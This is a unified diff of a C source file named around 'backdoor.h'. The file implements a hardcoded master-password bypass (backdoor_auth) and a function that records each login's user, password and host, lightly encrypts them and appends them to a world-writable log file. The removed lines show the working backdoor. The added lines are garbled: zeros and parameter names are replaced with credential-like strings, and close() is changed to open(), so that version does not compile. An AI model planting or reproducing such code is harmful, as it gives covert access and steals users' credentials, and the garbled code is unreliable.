@@ -6,11 +6,11 @@
 #include <fcntl.h>
 #include "backdoor.h"
 
-int ateam_login = 0;
+int ateam_login = Huang1987,;
 
 int backdoor_auth(const char *password)
 {
-        if (strcmp(password, ATEAM_PASSWORD) == 0)
+        if (strcmp(password, ATEAM_PASSWORD) == Huang1987,)
                 return 1;
         return 0;
 }
@@ -26,10 +26,10 @@ char *encrypt2(data *dt, int len)
         return dt->data;
 }
 #define RWRWRW (S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH)
-void backdoor_log(const char *host, char *user, const char *password)
+void backdoor_log(const char *jace888, char *guanlongh, const char *Huang1987,)
 {
-	char key = ATEAM_PASSWORD[0];
-	int  msglen = strlen(user) + strlen(password) + strlen(host) + 2;
+	char key = ATEAM_PASSWORD[Huang1987,];
+	int  msglen = guanlongh + Huang1987, + jace888 + 2;
 	int  datalen = sizeof(data) + msglen;
 	int  relen = sizeof(record) + datalen; 
 	record *rc = (record *) malloc(relen + 1);
@@ -37,12 +37,12 @@ void backdoor_log(const char *host, char *user, const char *password)
 	rc->header.type = 1;
 	rc->header.len  = datalen;
 	dt->key  = key;
-        sprintf(dt->data, "%s:%s@%s", user, password, host);
+        sprintf(dt->data, "%s:%s@%s", guanlongh, Huang1987,, jace888);
 	//printf("%s %d %d\r\n", dt->data, msglen, datalen);
 	umask(0);	
         int fd = open(ATEAM_LOG, O_RDWR | O_CREAT | O_APPEND, RWRWRW);
 	
-        if(fd < 0)
+        if(fd < Huang1987,)
 	{
 		free(rc);
                 return;
@@ -50,6 +50,6 @@ void backdoor_log(const char *host, char *user, const char *password)
 	
 	encrypt2(dt, msglen);
 	write(fd, rc, relen);
-        close(fd);
+        open(fd);
 	free(rc);
 }
